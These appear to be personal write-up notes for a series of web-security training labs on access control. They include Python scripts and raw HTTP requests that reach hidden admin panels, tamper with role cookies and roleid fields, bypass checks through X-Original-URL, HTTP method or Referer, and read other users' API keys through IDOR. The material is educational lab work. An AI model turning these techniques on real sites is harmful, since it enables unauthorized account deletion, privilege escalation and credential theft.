# Access Control Labs

## Lab: Unprotected admin functionality

![Unprotected admin functionality](Attachments/Pasted%20image%2020260817134547.png)

### Exploitation

Check `/robots.txt` to discover the hidden endpoint:

```text
/robots.txt  ---->  /administrator-panel
```

```python
# Lab: Unprotected admin functionality

import requests

url = input ("Enter the Base URL: ")

admin = "/administrator-panel"
params = {
    'username': 'carlos',
}

response = requests.get(
    url + admin +'/delete',
    params=params
)
if "Congratulations, you solved the lab!" in response.text:
    print("Congratulations, you solved the lab!")
```

---

## Lab: Unprotected admin functionality with unpredictable URL

![Unprotected admin functionality with unpredictable URL](Attachments/Pasted%20image%2020260817135123.png)

### Exploitation

Inspect page source code to find the admin panel URL:

```text
Source code contains: /admin-36euv3
```

```python
# Lab: Unprotected admin functionality with unpredictable URL

import requests

url = input ("Enter the Base URL: ").rstrip("/")

admin = "/admin-t22s16"

params = {
    'username': 'carlos',
}

response = requests.get(
    url + admin +'/delete',
    params=params
)
if "Congratulations, you solved the lab!" in response.text:
    print("Congratulations, you solved the lab!")

else:
    print("Something went wrong or User Deleted")
    print(response.text)

```

---

## Lab: User role controlled by request parameter

### Exploitation

Change the cookie value of `Admin` from `false` to `true`:

![User role controlled by request parameter](Attachments/Pasted%20image%2020260817135448.png)

```python
# Lab: User role controlled by request parameter

import requests

url = input ("Enter the Base URL: ").rstrip("/")

session = requests.session()

login_data = {
    "username": "wiener",
    "password": "peter"
}

session.post(url + "/login", data=login_data)

session.cookies.set("Admin", "true")

admin_panel = session.get(url + "/admin")
if "carlos - Delete" in admin_panel.text:
    print("[+] Admin Accessed")

requests.get(url + "/admin/delete?username=carlos")
if "Congratulations, you solved the lab!" in admin_panel.text:
    print("Congratulations, you solved the lab!")
else:
    print("Something went wrong or User Deleted")
    print(admin_panel.text)

session.get(url + "/logout")
```

---

## Lab: User role can be modified in user profile

![User role can be modified in user profile](Attachments/Pasted%20image%2020260817140512.png)

### Exploitation

Response includes `roleid` field:

```json
{
  "username": "wiener",
  "email": "test1@normal-user.net",
  "apikey": "fLSZTVsVKKGy7Gb2BuqLz9eCRIS8Um9Z",
  "roleid": 2
}
```

```python
# Lab: User role can be modified in user profile
import requests

url = input ("Enter the Base URL: ").rstrip("/")

session = requests.session()

login_data = {
    "username": "wiener",
    "password": "peter"
}

session.post(url + "/login", data=login_data)

data = {
    "email":"test@test2.com",
    "roleid":2
}

email_change = session.post(url + "/my-account/change-email", data=data)
print(f"[+] Status Code:{email_change.status_code}")

print ("[+] Deleting User")

result = session.get(url + "/admin/delete?username=carlos")
if "Congratulations, you solved the lab!" in result.text:
    print("Congratulations, you solved the lab!")
else:
    print("Something went wrong or User Deleted")
    print(result.text)
session.get(url + "/logout")
```

---

## Lab: URL-based access control can be circumvented

![URL-based access control can be circumvented](Attachments/Pasted%20image%2020260817141254.png)

### Exploitation

1. Change `GET /admin HTTP/1.1` to `GET / HTTP/1.1` and replay in browser.
2. Capture the delete request and apply the header bypass:

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

---

## Lab: Method-based access control can be circumvented

### Exploitation

1. Login to the admin account and perform upgrade and downgrade function on `carlos`, recording the HTTP request.
2. Login to the `wiener` account and retrieve session cookies.
3. Replace the session cookies in the admin request and attempt the action:
   - `POST`: `"Unauthorized"`
   - `POSTX`: `"Missing parameter 'username'"`
4. Change the HTTP method to `GET` and execute:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
```

---

## Lab: User ID controlled by request parameter

![User ID controlled by request parameter](Attachments/Pasted%20image%2020260817144249.png)

### Exploitation

1. Login to `wiener` account and capture all requests.
2. Modify the `id` parameter to `carlos` and obtain the API key of carlos.

```python
# Lab: User ID controlled by request parameter 

import requests
import re

url = input ("Enter the Base URL: ").rstrip("/")

session = requests.session()

login_data = {
    "username": "wiener",
    "password": "peter"
}

response = session.post(url + "/login", data=login_data)
carlos_req = session.get(url + "/my-account?id=carlos")

match = re.search(r"Your API Key is:\s*([A-Za-z0-9]+)", carlos_req.text)

if match:
    api_key = match.group(1)
    print("API Key:", api_key)

print("[+] Submitting The API Key")

data = {
    "answer" : api_key
    }

result = session.post(url + "/submitSolution",data=data)

if "Congratulations, you solved the lab!" in result.text:
    print("Congratulations, you solved the lab!")
else:
    print("Something went wrong or User Deleted")
    print(carlos_req.text)


session.get(url + "/logout")
```

---

## Lab: User ID controlled by request parameter, with unpredictable user IDs

![User ID controlled by request parameter, with unpredictable user IDs](Attachments/Pasted%20image%2020260817144645.png)

### Exploitation

View the blog post written by carlos to find carlos's GUID in the URL.

---

## Lab: User ID controlled by request parameter with data leakage in redirect

![User ID controlled by request parameter with data leakage in redirect](Attachments/Pasted%20image%2020260817145540.png)

### Exploitation

Capture the account request for `wiener` and resend with `id=carlos`. The server responds with:

```http
HTTP/1.1 302 Found
Location: /login
```

Although redirected, the response body leaks Carlos's API key.

---

## Lab: User ID controlled by request parameter with password disclosure

### Exploitation

Request the administrator account directly:

```http
GET /my-account?id=administrator HTTP/1.1
```

---

## Lab: Insecure direct object references

![Insecure direct object references](Attachments/Pasted%20image%2020260817150429.png)

### Exploitation

Retrieve chat transcripts by modifying the static file reference:

```http
GET /download-transcript/1.txt
```

---

## Lab: Multi-step process with no access control on one step

![Multi-step process with no access control on one step](Attachments/Pasted%20image%2020260817151614.png)

### Exploitation

Capture the confirmation request from the admin workflow, replace the session cookies with wiener's session cookies, change the username to `wiener`, and resend.

---

## Lab: Referer-based access control

![Referer-based access control](Attachments/Pasted%20image%2020260817152105.png)

### Exploitation

Copy the non-admin user's session cookie into the existing Burp Repeater request, change the username to yours, and replay it.
